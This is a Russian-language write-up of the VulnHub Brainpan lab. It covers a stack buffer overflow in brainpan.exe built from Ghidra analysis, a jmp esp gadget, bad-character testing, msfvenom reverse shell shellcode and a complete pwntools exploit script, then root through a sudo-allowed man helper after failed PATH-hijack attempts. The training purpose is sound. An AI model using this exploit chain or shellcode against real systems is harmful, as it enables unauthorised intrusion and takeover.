# VulnHub - 41-Brainpan

📅 Дата: 2025-05-22  
🧠 Сложность:  
💻 IP-адрес: 192.168.56.123  

---

## 🔍 Сканирование

```bash
export ip=192.168.56.123
export ports=9999,10000
sudo nmap -sT -Pn -sV -T4 -A -p $ports $ip -oN scans/nmap.txt
```

### Nmap
```bash
Nmap scan report for 192.168.56.123
Host is up (0.00088s latency).

PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
| fingerprint-strings: 
|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.3
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.94SVN%I=7%D=5/22%Time=682EADB8%P=x86_64-pc-linux-gnu%r
SF:(NULL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|
SF:_\|\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x
SF:20\x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\
SF:|\x20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\
SF:|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\
SF:|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20
SF:_\|\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x2
SF:0\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x2
SF:0\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x2
SF:0\x20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x
SF:20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x2
SF:0\x20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPA
SF:N\x20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTE
SF:R\x20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20>>\x20");
MAC Address: 08:00:27:08:2C:9B (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10
Network Distance: 1 hop
```


---

## 🕵️ Enumeration
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub]
└─$ ffuf -fc 404 -t 100 -u http://$ip:10000/FUZZ -w /media/sf_Exchange/Dictionaries/Dir/directory-list-2.3-medium.txt
bin                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 18ms]
```
![brainpan scan](screenshots/brainpan.exe.png)

Информация о файле  
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/41-Brainpan/files]
└─$ file brainpan.exe 
brainpan.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows, 5 sections
```

Загружаю в Ghidra
![ghidra 1](screenshots/gh1.png)

Вижу переменные отказа и разрешения доступа:
```bash
  local_404 = "                          ACCESS DENIED\n";
  local_408 = "                          ACCESS GRANTED\n";
```
В переменную **char local_3fc [1016];** считывается пользовательский ввод (1000 байт) -> затирание данных можно не рассматривать

Функция **get_reply(local_3fc)** осуществляет какую-то проверку и возвращает **0**, если она успешна.

Иду в функцию **get_reply()**:
![ghidra 2](screenshots/gh2.png)

Получение доступа с использованием `shitstorm` ничего не дало:  
![ghidra 3](screenshots/gh3.png)

Так что смотрю переполнение буфера: param_1 [1000 байт] записываются в переменную local_20c [520 байт]

Стек функции `get_reply(char * param_1)` имеет такой вид:
<img width="845" height="354" alt="image" src="https://github.com/user-attachments/assets/bd5642c0-e4f8-4ef3-ae14-83657452443f" />
  
т.е. для изменения адреса возврата, в переменную `local_20c` нужно положить 520 байт,   
ещё 4 байта перезапишут `EBP`,  
и ещё 4 байта перезапишут `return adress`  
  
Итого: **520**(local_20c) + **4**(EBP) + **4**(EIP)

Запускаю brainpan.exe в отладчике immunity debugger на 32 битной системе Windows7  
<img width="1917" height="1014" alt="image" src="https://github.com/user-attachments/assets/b0544e88-1308-4de8-a9b3-4437ce3bfa34" />

Смотрю защиту `!mona modules`
<img width="1143" height="367" alt="image" src="https://github.com/user-attachments/assets/ae8d23b8-96b2-4840-899e-7fe52cab7270" />  
 - **ASLR** (Address Space Layout Randomization): Указано "False", что означает, что защита ASLR отключена ==> адреса памяти остаются постоянными.
 - **NXCompat** (No Execute): "False", что указывает на отсутствие защиты от выполнения кода в областях данных (DEP отключена).

Таким образом, если удастся:  
 - найти постоянный адрес инструкции `call esp`, `jmp esp`, или немного более сложные rop chains для вызова кода из стека   
 - получить контроль над регистром EIP, чтобы положить туда адрес инструкции вызова кода из стека  
 - положить в стек свою полезную нагрузку

то можно будет заставить приложение выполнить произвольный код.

Ищу адрес `call esp`, `jmp esp` внутри **brainpan.exe**  
Для этого использую утилиту `ROPgadget`.  
Можно использовать команду, которая выведет только гаджеты, содержащие call, jmp и ссылки на esp:
```bash
ROPgadget --binary ./brainpan.exe --only "call|jmp|esp"
```

Но я предпочитаю выводить все гаджеты и искать вручную регулярными выражениями, меняя уровень вложенности
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/41-Brainpan/files]
└─$ ROPgadget --binary ./brainpan.exe > brainpan.allgadgets.txt
                                                                                                                   
┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/41-Brainpan/files]
└─$ grep -iE "call esp" brainpan.allgadgets.txt | awk -F';' 'NF <= 2' 
                                                                                                                   
┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/41-Brainpan/files]
└─$ grep -iE "jmp esp" brainpan.allgadgets.txt | awk -F';' 'NF <= 2'
0x311712f3 : jmp esp
0x311712f1 : mov ebp, esp ; jmp esp
```

Есть `0x311712f3 : jmp esp`, далее нужно проверить возможность получения контроля над адресом возврата и возможностью записать полезную нагрузку в стек.

Пробую подключиться с kali на виртуальную машину с Windows7 и запущенным brainpan.exe в immunity debugger  
```bash
┌──(kali㉿0x2d-pentest)-[~]
└─$ sudo nmap -sn 192.168.56.106/24                                                                  
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-18 06:16 EDT
Nmap scan report for 192.168.56.100
Host is up (0.00031s latency).
MAC Address: 08:00:27:81:C6:A7 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.124
Host is up (0.00072s latency).
MAC Address: 08:00:27:99:B1:5F (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.106
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 9.63 seconds
                                                                                                                  
┌──(kali㉿0x2d-pentest)-[~]
└─$ nc 192.168.56.124 9999             
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> asdfasdf\
                          ACCESS DENIED
```

Отлично, хост `192.168.56.124` и порт `9999`.  
Чтобы проверить уязвимость переполнения буфера, буду использовать библиотеку `pwntools`.  
Код стартового шаблона я немного переделал под себя, так что он слегка отличается от дефолтного.  
Активирую виртуальное окружение и генерирую шаблон  
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/41-Brainpan/files]
└─$ actv
                                                                                                                  
┌──(.venv)─(kali㉿0x2d-pentest)-[~/Labs/VulnHub/41-Brainpan/files]
└─$ pwn template ./brainpan.exe --quiet --host 192.168.56.124 --port 9999 > x.py
[*] Automatically detecting challenge binaries...
```

Далее будет удобнее работать в PyCharm  
```python
from pwn import *

context.update(arch='i386')
exe = './brainpan.exe'

host = args.HOST or '192.168.56.124'
port = int(args.PORT or 9999)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe] + argv, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

#====================PAYLOAD DEFINITION=====================
junk    = b'A'*520
EBP     = b'B'*4
EIP     = b'C'*4
stack   = b'D'*12

payload = b''.join([
    junk,
    EBP,
    EIP,
    stack,
])
#========================CONNECTION=========================
io = start()
print(io.recv().decode('utf-8'))
io.sendline(payload)
io.interactive()

#========================INFORMATION========================
# RDI, RSI, RDX, RCX, R8, R9, STACK
#       1    2    3    4   5    6
```

Если всё правильно рассчитал, то должен получить  
  - **СССС** в адресе возврата 
  - 3 строки букв **D** в стеке  

Перезапускаю процесс в отладчике и ставлю breakpoint на вызов функции `get_reply()`
<img width="1917" height="1017" alt="image" src="https://github.com/user-attachments/assets/4612c213-b97c-4238-9388-523e827c104b" />

Получаю контроль над адресом возврата  
<img width="1920" height="1022" alt="image" src="https://github.com/user-attachments/assets/90061dc7-7b56-4a39-993c-306a052ba824" />

### Далее ищу **badchars**

Небольшая настройка immunity debugger
`!mona config -set workingfolder c:\mona\%p`

Массив байтов можно сгенерировать в **mona** и исключить из него нулевой **"\x00"**
`!mona bytearray -b "\x00"`

А можно написать код **python**
```python
exclude_list = ["\\x00"]

for x in range(1, 256):
    hex_str = "\\x" + "{:02x}".format(x)
    if hex_str not in exclude_list:
        print(hex_str, end='')
print()
```

Я буду использовать такой код и генерировать массив байтов прямо в шаблоне:
```python
from pwn import *

context.update(arch='i386')
exe = './brainpan.exe'

host = args.HOST or '192.168.56.124'
port = int(args.PORT or 9999)

#====================PAYLOAD DEFINITION=====================
junk    = b'A'*520
EBP     = b'B'*4
EIP     = b'C'*4

exclude_list = ["\\x00"]
stack   = ''.join(f"\\x{x:02x}" for x in range(1, 256) if f"\\x{x:02x}" not in exclude_list)
log.info(b'-------------------------------------------')
log.success(f'badchars: {stack}')
log.info(b'-------------------------------------------')

payload = b''.join([
    junk,
    EBP,
    EIP,
    stack.encode('latin-1'),
])
#========================CONNECTION=========================
io = start()

print(io.recv().decode('utf-8'))
io.sendline(payload)

io.interactive()
```

Мой код попадает в стек по адресу `ESP 0022F930`  
<img width="439" height="303" alt="image" src="https://github.com/user-attachments/assets/96b29612-0dca-4339-8c96-fa6dac88d0f4" />


Сравниваю в **mona** `!mona compare -f "c:\mona\brainpan\bytearray.bin" -a 0022F930`  
<img width="449" height="371" alt="image" src="https://github.com/user-attachments/assets/0b4a9e05-fc50-42d4-b5c3-a188fed80f64" />

Получается, что кроме '\x00' badchars отсутствуют, так что генерирую reverse shell, но уже для виртуальной машины с лабораторной, который помещу в стек.
```bash
┌──(.venv)─(kali㉿0x2d-pentest)-[~/Labs/VulnHub/41-Brainpan/files]
└─$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.106 LPORT=4444 -f py -e x86/shikata_ga_nai -b "\x00" -v stack
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of py file: 497 bytes
stack =  b""
stack += b"\xb8\xbe\x8f\x37\x5e\xd9\xcb\xd9\x74\x24\xf4\x5f"
stack += b"\x33\xc9\xb1\x12\x83\xef\xfc\x31\x47\x0e\x03\xf9"
stack += b"\x81\xd5\xab\x34\x45\xee\xb7\x65\x3a\x42\x52\x8b"
stack += b"\x35\x85\x12\xed\x88\xc6\xc0\xa8\xa2\xf8\x2b\xca"
stack += b"\x8a\x7f\x4d\xa2\xcc\x28\x95\x58\xa5\x2a\xe6\x8d"
stack += b"\x69\xa2\x07\x1d\xf7\xe4\x96\x0e\x4b\x07\x90\x51"
stack += b"\x66\x88\xf0\xf9\x17\xa6\x87\x91\x8f\x97\x48\x03"
stack += b"\x39\x61\x75\x91\xea\xf8\x9b\xa5\x06\x36\xdb"
```

Устанавливаю **EIP** на адрес инструкции `jmp esp` (**0x311712f3**).  
Для этого воспользуюсь функцией `p32()` из `pwnlib`  
```python
EIP     = p32(0x311712f3)
```

Итоговый код:
```python
from pwn import *

context.update(arch='i386')
exe = './brainpan.exe'

host = args.HOST or '192.168.56.124'
port = int(args.PORT or 9999)

#====================PAYLOAD DEFINITION=====================
junk    = b'A'*520
EBP     = b'B'*4
EIP     = p32(0x311712f3)
nop     = b'\x90'*8

stack =  b""
stack += b"\xb8\xbe\x8f\x37\x5e\xd9\xcb\xd9\x74\x24\xf4\x5f"
stack += b"\x33\xc9\xb1\x12\x83\xef\xfc\x31\x47\x0e\x03\xf9"
stack += b"\x81\xd5\xab\x34\x45\xee\xb7\x65\x3a\x42\x52\x8b"
stack += b"\x35\x85\x12\xed\x88\xc6\xc0\xa8\xa2\xf8\x2b\xca"
stack += b"\x8a\x7f\x4d\xa2\xcc\x28\x95\x58\xa5\x2a\xe6\x8d"
stack += b"\x69\xa2\x07\x1d\xf7\xe4\x96\x0e\x4b\x07\x90\x51"
stack += b"\x66\x88\xf0\xf9\x17\xa6\x87\x91\x8f\x97\x48\x03"
stack += b"\x39\x61\x75\x91\xea\xf8\x9b\xa5\x06\x36\xdb"

payload = b''.join([
    junk,
    EBP,
    EIP,
    nop,
    stack,
])
#========================CONNECTION=========================
io = start()

print(io.recv().decode('utf-8'))
io.sendline(payload)

io.interactive()
```


## 📂 Получение доступа

Запускаю listener
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/41-Brainpan/files]
└─$ nc -lvnp 4444         
listening on [any] 4444 ...
```

И запускаю скрипт, не забыв поменять HOST для выполнения атаки не на запущенное приложение brainpan.exe в immunity debugger на моей виртуальной машине, а на виртуальную машину с лабораторной
```bash
python3 x.py HOST=192.168.56.123
```

Получаю reverse shell
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/41-Brainpan/files]
└─$ nc -lvnp 4444         
listening on [any] 4444 ...
connect to [192.168.56.106] from (UNKNOWN) [192.168.56.123] 55484
whoami
puck
pwd
/home/puck
which python3
/usr/bin/python3
which bash
/bin/bash
```

И немного улучшаю оболочку с помощью **python**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Осматриваюсь
```bash
puck@brainpan:/home/puck$ ls -la
ls -la
total 48
drwx------ 7 puck puck 4096 Mar  6  2013 .
drwxr-xr-x 5 root root 4096 Mar  4  2013 ..
-rw------- 1 puck puck    0 Mar  5  2013 .bash_history
-rw-r--r-- 1 puck puck  220 Mar  4  2013 .bash_logout
-rw-r--r-- 1 puck puck 3637 Mar  4  2013 .bashrc
drwx------ 3 puck puck 4096 Mar  4  2013 .cache
drwxrwxr-x 3 puck puck 4096 Mar  4  2013 .config
-rw------- 1 puck puck   55 Mar  5  2013 .lesshst
drwxrwxr-x 3 puck puck 4096 Mar  4  2013 .local
-rw-r--r-- 1 puck puck  675 Mar  4  2013 .profile
drwxrwxr-x 4 puck puck 4096 Jul 19 18:22 .wine
-rwxr-xr-x 1 root root  513 Mar  6  2013 checksrv.sh
drwxrwxr-x 3 puck puck 4096 Mar  4  2013 web
puck@brainpan:/home/puck$ id
id
uid=1002(puck) gid=1002(puck) groups=1002(puck)
puck@brainpan:/home/puck$ ls -la /home
ls -la /home
total 20
drwxr-xr-x  5 root    root    4096 Mar  4  2013 .
drwxr-xr-x 22 root    root    4096 Mar  4  2013 ..
drwx------  4 anansi  anansi  4096 Mar  4  2013 anansi
drwx------  7 puck    puck    4096 Mar  6  2013 puck
drwx------  3 reynard reynard 4096 Mar  4  2013 reynard
```

## ⚙️ Привилегии

Есть `sudo -l`
```bash
puck@brainpan:/home/puck$ sudo -l
sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
```

Запускаю `sudo /home/anansi/bin/anansi_util`
```bash
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util
sudo /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
```

И пробую action `network`
```bash
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util
sudo /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
```

При этом, похоже, выполняется команда `ip a`
```bash
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util network
sudo /home/anansi/bin/anansi_util network
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 1000
    link/ether 08:00:27:08:2c:9b brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.123/24 brd 192.168.56.255 scope global eth0
    inet6 fe80::a00:27ff:fe08:2c9b/64 scope link 
       valid_lft forever preferred_lft forever
```

Проверил на уязвимость $PATH для `ip`
```bash
puck@brainpan:/home/puck$ echo '/bin/sh' > /tmp/ip
echo '/bin/sh' > /tmp/ip
puck@brainpan:/home/puck$ chmod +x /tmp/ip
chmod +x /tmp/ip
puck@brainpan:/home/puck$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
puck@brainpan:/home/puck$ echo $PATH
echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util network
sudo /home/anansi/bin/anansi_util network
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 1000
    link/ether 08:00:27:08:2c:9b brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.123/24 brd 192.168.56.255 scope global eth0
    inet6 fe80::a00:27ff:fe08:2c9b/64 scope link 
       valid_lft forever preferred_lft forever
```


Следующая команда выполняет команду `top`, но нужно немного помочь
```bash
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util proclist
sudo /home/anansi/bin/anansi_util proclist
'unknown': unknown terminal type.
puck@brainpan:/home/puck$ export TERM=xterm
export TERM=xterm
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util proclist
sudo /home/anansi/bin/anansi_util proclist
top - 18:57:50 up  1:54,  0 users,  load average: 0.00, 0.01, 0.04
Tasks:  87 total,   1 running,  86 sleeping,   0 stopped,   0 zombie
%Cpu(s):  0.0 us,  0.1 sy,  0.0 ni, 99.5 id,  0.3 wa,  0.0 hi,  0.0 si,  0.0 st
KiB Mem:    248936 total,   241828 used,     7108 free,    27472 buffers
KiB Swap:   520188 total,        0 used,   520188 free,   161204 cached

  PID USER      PR  NI  VIRT  RES  SHR S  %CPU %MEM    TIME+  COMMAND           
    1 root      20   0  3496 1880 1296 S   0.0  0.8   0:00.33 init              
    2 root      20   0     0    0    0 S   0.0  0.0   0:00.00 kthreadd          
    3 root      20   0     0    0    0 S   0.0  0.0   0:01.15 ksoftirqd/0       
    4 root      20   0     0    0    0 S   0.0  0.0   0:00.00 kworker/0:0       
    6 root      rt   0     0    0    0 S   0.0  0.0   0:00.00 migration/0       
    7 root      rt   0     0    0    0 S   0.0  0.0   0:00.19 watchdog/0        
    8 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 cpuset            
    9 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 khelper           
   10 root      20   0     0    0    0 S   0.0  0.0   0:00.00 kdevtmpfs         
   11 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 netns             
   12 root      20   0     0    0    0 S   0.0  0.0   0:00.08 sync_supers       
   13 root      20   0     0    0    0 S   0.0  0.0   0:00.00 bdi-default       
   14 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 kintegrityd       
   15 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 kblockd           
   16 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 ata_sff           
   17 root      20   0     0    0    0 S   0.0  0.0   0:00.00 khubd             
   18 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 md
```

Проверил на уязвимость $PATH для `top`
```bash
puck@brainpan:/home/puck$ echo '/bin/sh' > /tmp/top
echo '/bin/sh' > /tmp/top
puck@brainpan:/home/puck$ chmod +x /tmp/top
chmod +x /tmp/top
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util proclist
sudo /home/anansi/bin/anansi_util proclist
top - 19:45:20 up  2:41,  0 users,  load average: 0.00, 0.01, 0.05
Tasks:  97 total,   1 running,  96 sleeping,   0 stopped,   0 zombie
%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.2 id,  0.4 wa,  0.0 hi,  0.1 si,  0.0 st
KiB Mem:    248936 total,   237392 used,    11544 free,    41464 buffers
KiB Swap:   520188 total,       48 used,   520140 free,    84756 cached

  PID USER      PR  NI  VIRT  RES  SHR S  %CPU %MEM    TIME+  COMMAND           
    1 root      20   0  3496 1832 1296 S   0.0  0.7   0:00.34 init              
    2 root      20   0     0    0    0 S   0.0  0.0   0:00.00 kthreadd          
    3 root      20   0     0    0    0 S   0.0  0.0   0:01.90 ksoftirqd/0       
    4 root      20   0     0    0    0 S   0.0  0.0   0:00.00 kworker/0:0       
    6 root      rt   0     0    0    0 S   0.0  0.0   0:00.00 migration/0       
    7 root      rt   0     0    0    0 S   0.0  0.0   0:00.27 watchdog/0        
    8 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 cpuset            
    9 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 khelper           
   10 root      20   0     0    0    0 S   0.0  0.0   0:00.00 kdevtmpfs         
   11 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 netns             
   12 root      20   0     0    0    0 S   0.0  0.0   0:00.12 sync_supers       
   13 root      20   0     0    0    0 S   0.0  0.0   0:00.00 bdi-default       
   14 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 kintegrityd       
   15 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 kblockd           
   16 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 ata_sff           
   17 root      20   0     0    0    0 S   0.0  0.0   0:00.00 khubd             
   18 root       0 -20     0    0    0 S   0.0  0.0   0:00.00 md                

puck@brainpan:/home/puck$ 
```

Следующая команда выполняет команду `man` и передает ей параметр
```bash
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual ls
sudo /home/anansi/bin/anansi_util manual ls
```

Это можно использовать для повышения привилегий  
<img width="832" height="189" alt="image" src="https://github.com/user-attachments/assets/ecd98ab4-72f3-46a6-b9eb-7e194863bb68" />  

Получаю `root`
```bash
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual man
sudo /home/anansi/bin/anansi_util manual man
No manual entry for manual
# id
id
uid=0(root) gid=0(root) groups=0(root)
# python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@brainpan:/usr/share/man#
root@brainpan:/home/anansi# cd /root
cd /root
root@brainpan:~# ls -la
ls -la
total 40
drwx------  5 root root 4096 Mar  7  2013 .
drwxr-xr-x 22 root root 4096 Mar  4  2013 ..
drwx------  2 root root 4096 Mar  4  2013 .aptitude
-rw-------  1 root root    0 Mar  7  2013 .bash_history
-rw-r--r--  1 root root 3106 Jul  3  2012 .bashrc
-rw-r--r--  1 root root  564 Mar  7  2013 b.txt
drwx------  2 root root 4096 Mar  4  2013 .cache
-rw-------  1 root root   39 Mar  5  2013 .lesshst
-rw-r--r--  1 root root  140 Jul  3  2012 .profile
-rw-r--r--  1 root root   74 Mar  5  2013 .selected_editor
drwx------  2 root root 4096 Mar  4  2013 .ssh
root@brainpan:~# cat b.txt
cat b.txt
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|


                                              http://www.techorganic.com 



root@brainpan:~# 
```
